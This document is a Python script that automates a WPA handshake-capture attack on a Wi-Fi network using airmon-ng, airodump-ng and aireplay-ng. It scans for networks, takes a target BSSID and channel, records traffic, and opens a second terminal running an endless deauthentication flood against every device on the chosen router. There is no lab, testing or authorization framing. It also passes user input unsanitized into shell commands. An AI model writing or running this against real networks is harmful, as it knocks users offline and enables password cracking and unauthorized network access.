#!/usr/bin/env python3
import subprocess
import os
import time
import signal
import sys

# Function to run a command and check for errors
def run_command(command, error_message):
    try:
        result = subprocess.run(command, shell=True, check=True, stderr=subprocess.PIPE, text=True)
        if result.stderr:
            print(f"Warning: {error_message} - {result.stderr}")
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error: {error_message} - {e.stderr}")
        cleanup()
        exit(1)

# Check if a terminal emulator is available
def check_terminal():
    terminals = ['qterminal', 'xfce4-terminal', 'gnome-terminal', 'lxterminal']
    for term in terminals:
        if subprocess.run(['which', term], stdout=subprocess.PIPE).returncode == 0:
            return term
    print("Error: No terminal emulator found (tried qterminal, xfce4-terminal, gnome-terminal, lxterminal).")
    print("Please install one, e.g., 'sudo apt install qterminal'")
    cleanup()
    exit(1)

# Cleanup function to stop monitor mode
def cleanup():
    print("Cleaning up...")
    run_command("sudo airmon-ng stop wlan0mon", "Failed to stop monitor mode")
    print("Monitor mode stopped.")

# Handle script interruption (e.g., CTRL + C in main terminal)
def signal_handler(sig, frame):
    print("\nScript interrupted.")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Step 1: Prepare the interface
print("Preparing wireless interface...")
run_command("sudo airmon-ng check kill", "Failed to kill interfering processes")
run_command("sudo airmon-ng start wlan0", "Failed to start monitor mode on wlan0")

# Step 2: Scan for nearby networks in the current terminal
print("Scanning for nearby networks... Press CTRL + C to stop the scan.")
try:
    subprocess.run("sudo airodump-ng wlan0mon", shell=True)
except KeyboardInterrupt:
    print("Scan stopped. Proceeding...")
except subprocess.CalledProcessError as e:
    print(f"Error during scan: {e.stderr}")
    cleanup()
    exit(1)

# Step 3: Get target details from user
channel = input("Enter the target channel: ")
bssid = input("Enter the target BSSID (e.g., 00:14:22:33:44:55): ")

# Step 4: Start capture in the current terminal and deauth in a new window
terminal = check_terminal()
print(f"Using terminal: {terminal}")

# Start packet capture in the current terminal
print("Starting packet capture in this terminal...")
capture_cmd = f"sudo airodump-ng -w wificap -c {channel} --bssid {bssid} wlan0mon"
try:
    capture_process = subprocess.Popen(capture_cmd, shell=True)
except subprocess.SubprocessError as e:
    print(f"Error starting packet capture: {e}")
    cleanup()
    exit(1)

# Give a moment for the capture to start
time.sleep(2)

# Start deauthentication in a new terminal window to target all devices
print("Starting deauthentication of all devices in a new window...")
deauth_cmd = f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon"
try:
    # Use qterminal with execute option and keep the terminal open
    subprocess.Popen([terminal, "-e", f"bash -c '{deauth_cmd}; bash'"])
    print(f"Debug: Attempted to run '{deauth_cmd}' in new terminal.")
except subprocess.SubprocessError as e:
    print(f"Error starting deauthentication: {e}")
    capture_process.terminate()  # Stop capture if deauth fails
    cleanup()
    exit(1)

print("Capture is running in this terminal. Deauth is running in a new window.")
print("Deauth will target all devices connected to the selected router.")
print("Stop them manually with CTRL + C in each terminal when the handshake is captured.")
print("Captured packets will be saved as 'wificap-*.cap' in the current directory.")